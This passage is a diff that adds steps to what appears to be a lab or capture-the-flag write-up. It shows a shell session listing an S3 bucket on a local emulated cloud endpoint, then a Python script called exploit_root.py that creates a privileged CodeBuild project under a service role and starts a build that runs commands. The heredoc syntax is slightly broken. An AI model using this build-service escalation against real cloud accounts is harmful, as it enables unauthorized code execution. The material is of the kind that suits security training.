@@ -500,4 +500,38 @@ worker@a147090e066a:~$ curl 172.18.0.2:9169
 
 ```
 
+``` bash
+
+worker@a147090e066a:~$ curl 172.18.0.2:4566/nimbus-dev-artifacts/
+<?xml version="1.0" encoding="UTF-8"?><ListBucketResult xmlns="http://s3.amazonaws.com/doc/2006-03-01/"><Name>nimbus-dev-artifacts</Name><Prefix></Prefix><MaxKeys>1000</MaxKeys><IsTruncated>false</IsTruncated><Contents><Key>source/worker.py</Key><LastModified>2026-07-10T17:39:57Z</LastModified><ETag>&quot;47109e759cbf87fd1c47d3a5097582ee&quot;</ETag><Size>1755</Size><StorageClass>STANDARD</StorageClass></Contents></ListBucketResult>worker@a147090e066a:~$
+worker@a147090e066a:~$
+
+```
+
+``` python3
+
+cat > exploit_root.py <<
+
+import boto3
+
+cb = boto3.client("codebuild", endpoint_url="http://172.18.0.2:4566", region_name="us-east-1")
+
+cb.create_project(
+    name="poc",
+    source={"type": "NO_SOURCE", "buildspec": "version: 0.2\nphases:\n  build:\n    commands:\n      - id\n      - cat /etc/hostname"},
+    artifacts={"type": "NO_ARTIFACTS"},
+    environment={
+        "type": "LINUX_CONTAINER",
+        "image": "amazonlinux",
+        "computeType": "BUILD_GENERAL1_SMALL",
+        "privilegedMode": True,
+    },
+    serviceRole="arn:aws:iam::847219365028:role/codebuild-role",
+)
+
+resp = cb.start_build(projectName="poc")
+print(resp["build"]["id"])
+EOF
+
+
 
